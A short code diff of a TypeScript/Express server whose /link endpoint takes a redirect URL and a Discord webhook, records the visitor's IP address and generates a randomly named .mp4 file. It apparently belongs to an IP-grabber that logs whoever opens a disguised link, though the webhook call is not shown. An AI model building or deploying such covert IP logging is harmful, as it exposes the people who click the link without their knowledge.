@@ -22,17 +22,17 @@ const PORT = process.env.PORT || 8000,
 
 app.use(cors());
 
-app.all("/test", (_, res) => res.send("hello"));
-
 app.get("/link", (req, res) => {
-    // const { ip } = req;
-    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    let ip = (req.headers["x-forwarded-for"] ||
+        req.socket.remoteAddress) as string;
     const { url, wh } = req.query;
 
     if (!(url && wh))
         return res.send(
             "provide a url to redirect to and a discord webhook link.<br>`/link?url=whatever&wh=12369420`"
         );
+
+    if (ip.startsWith("::ffff:")) ip = ip.substring(7);
 
     const out = joinPath(__dirname, nanoid(5) + ".mp4"),
         img = getRandomImg();
